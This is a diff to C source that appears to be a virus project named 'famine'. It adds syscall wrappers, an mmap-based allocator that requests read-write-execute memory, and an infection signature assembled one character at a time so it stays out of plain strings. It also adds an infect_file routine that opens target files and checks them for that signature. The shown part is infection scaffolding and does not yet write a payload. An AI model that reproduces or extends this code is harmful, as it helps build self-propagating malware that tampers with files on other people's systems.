@@ -29,11 +29,11 @@ ft_exit(int exit_code) {
     sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
 }
 inline int
-ft_write(int fd, void *ptr, size_t size) {
+ft_write(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
 }
 inline int
-ft_read(int fd, void *ptr, size_t size) {
+ft_read(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
 }
 
@@ -57,6 +57,17 @@ ft_print_zero() {
     ft_write(1, &b, 1);
 }
 
+#include <sys/mman.h>
+inline uint64_t
+ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
+    return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
+}
+
+inline void *
+ft_malloc(uint64_t size) {
+    return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+}
+
 inline int
 ft_open(char *path, int flags, mode_t mode) {
     return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
@@ -68,7 +79,7 @@ ft_getdents64(int fd, char dirp[], size_t count) {
 }
 
 inline int
-ft_strlen(char *str) {
+ft_strlen(volatile char *str) {
     int i = 0;
     while (str[i] != '\0')
         i++;
@@ -76,7 +87,7 @@ ft_strlen(char *str) {
 }
 
 inline int
-ft_strstr(char *haystack, char *needle, size_t size) {
+ft_strstr(volatile char *haystack, volatile char *needle, size_t size) {
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
     int i = 0;
     int j;
@@ -102,7 +113,7 @@ ft_strstr(char *haystack, char *needle, size_t size) {
 }
 
 inline int
-ft_string_search_fd(int fd, char *needle) {
+ft_string_search_fd(int fd, volatile char *needle) {
     const uint64_t BUF_SIZE_WITHOUT_OVERLAP = 1000;
     const uint64_t NEEDLE_SIZE = ft_strlen(needle);
     const uint64_t BUF_SIZE = BUF_SIZE_WITHOUT_OVERLAP + NEEDLE_SIZE;
@@ -120,30 +131,48 @@ ft_string_search_fd(int fd, char *needle) {
     return 0;
 }
 
+inline void
+signature_fill(volatile char *buf) {
+    buf[0] = 'f';
+    buf[1] = 'a';
+    buf[2] = 'm';
+    buf[3] = 'i';
+    buf[4] = 'n';
+    buf[5] = 'e';
+    buf[6] = ' ';
+    buf[7] = 'a';
+    buf[8] = 'b';
+    buf[9] = 'i';
+    buf[10] = 'e';
+    buf[11] = 'd';
+    buf[12] = '-';
+    buf[13] = 'c';
+    buf[14] = 'h';
+    buf[15] = ' ';
+    buf[16] = 'f';
+    buf[17] = 'b';
+    buf[18] = 'r';
+    buf[19] = 'u';
+    buf[20] = 'g';
+    buf[21] = 'g';
+    buf[22] = 'e';
+    buf[23] = 'm';
+    buf[24] = '\0';
+}
+
 inline int
 infect_file(char *path) {
     int fd = ft_open(path, O_RDWR, 0);
     if (fd < 0) return (1);
 
-    char SIGNATURE[10];
-    for (int i = 0; i < 10; i++)
-        SIGNATURE[i] = '0';
-    SIGNATURE[9] = 0;
+    volatile char signature[30];
+    signature_fill(signature);
 
-    const uint8_t has_signature = ft_string_search_fd(fd, SIGNATURE);
-    char one = '1';
-    char zero = '0';
-    char nl = '\n';
-    ft_write(1, path, ft_strlen(path));
-    ft_write(1, &nl, 1);
-    if (has_signature)
-        ft_write(1, &one, 1);
-    else
-        ft_write(1, &zero, 1);
-    ft_write(1, &nl, 1);
-    ft_write(1, &nl, 1);
+    const uint8_t has_signature = ft_string_search_fd(fd, signature);
 
     if (has_signature) return (0);
+
+    ft_write(1, path, ft_strlen(path));
 
     return (0);
 }
